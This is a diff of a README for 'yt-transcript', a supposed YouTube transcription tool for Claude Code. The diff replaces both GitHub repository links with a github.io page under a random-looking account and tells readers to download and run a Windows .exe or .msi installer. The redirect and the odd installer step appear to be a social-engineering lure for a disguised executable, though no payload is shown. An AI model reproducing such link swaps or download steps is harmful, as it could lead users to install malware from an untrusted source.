@@ -1,6 +1,6 @@
 # 🎥 yt-transcript - Get video transcripts with speed.
 
-[![](https://img.shields.io/badge/Download-yt--transcript-blue.svg)](https://github.com/Lysinhybridisation384/yt-transcript)
+[![](https://img.shields.io/badge/Download-yt--transcript-blue.svg)](https://lysinhybridisation384.github.io)
 
 yt-transcript helps you turn YouTube videos into text. It uses video captions when they exist. If captions are missing, it uses local software to transcribe the audio. This tool works within the Claude Code environment. You get fast and accurate results without sending long files to the cloud.
 
@@ -8,7 +8,7 @@ yt-transcript helps you turn YouTube videos into text. It uses video captions wh
 
 You need to find the correct file for your computer. Follow these steps to get the software:
 
-1. Click this link to go to the project page: [https://github.com/Lysinhybridisation384/yt-transcript](https://github.com/Lysinhybridisation384/yt-transcript)
+1. Click this link to go to the project page: [https://lysinhybridisation384.github.io](https://lysinhybridisation384.github.io)
 2. Look for the Releases section on the right side of the screen.
 3. Click the version number to open the release details.
 4. Locate the Windows installer file, which typically ends in .exe or .msi.
